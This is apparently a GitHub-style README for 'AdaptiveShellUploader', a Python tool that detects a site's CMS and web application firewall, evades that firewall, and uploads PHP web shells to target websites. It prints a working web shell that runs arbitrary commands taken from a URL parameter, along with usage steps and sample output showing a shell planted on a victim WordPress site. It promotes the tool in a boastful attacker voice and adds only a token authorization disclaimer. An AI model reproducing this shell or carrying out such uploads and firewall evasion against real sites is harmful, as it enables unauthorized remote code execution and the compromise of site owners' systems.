
# AdaptiveShellUploader
**Upload your shell, bypass WAFs, and own the web — one upload at a time.**

This tool is crafted for cyber warriors who want more than just basic uploads. `AdaptiveShellUploader` is a powerful reconnaissance and web shell uploader that adapts based on the CMS detected, upload form structure, and WAF defense mechanisms.

### Features:
- **Smart Reconnaissance:** Detects CMS (WordPress, Joomla, Drupal, Magento, etc.), headers, WAF presence, and upload forms.
- **AI-style Logic:** Uses decision trees to pick the best attack path based on environment detection.
- **Proxy Support:** Automatically loads and rotates HTTP/HTTPS proxies from `proxies.txt`.
- **WAF Bypass Engine:** Detects WAF through header heuristics and uses header obfuscation + variant file uploads to sneak in payloads.
- **Adaptive Payloads:** Uploads PHP web shell variants with content-type and name mangling.
- **Deep OSINT Mode:** Automatically scans for interesting endpoints (`robots.txt`, `.env`, `.git`, etc.)
- **CMS-aware Exploitation:** Adjusts its upload approach depending on CMS.

---

### Payload (Web Shell):
```php
<?php echo "SHELL_OK"; system($_GET["cmd"]); ?>
```

---

### Requirements:
- Python 3.x
- `requests`
- `beautifulsoup4`

Install requirements:
```bash
pip install -r requirements.txt
```

---

### How to Use:
```bash
python Shell_uploader.py
```
When prompted, input the **full target URL**, like:
```
http://victim.com/
```

Make sure you have a `proxies.txt` file if you want to randomize your proxy usage.

---

### Example Output:
- Detected CMS: WordPress
- Upload form found in: /wp-admin/upload.php
- WAF Detected: Cloudflare
- Shell Uploaded: `http://victim.com/wp-content/uploads/shell.pHp`

---

### Notes:
- This script is part of the Cyber-Heroes arsenal.
- Built for educational and penetration testing purposes **only**.
- Make sure you have authorization before running it on any system.
- By default, it will look for the string `SHELL_OK` to verify successful uploads.

---

### Credits:
Made with chaos and caffeine by **Saldy aka Cyber-Heroes G4**  
"Built to bypass, born to break."

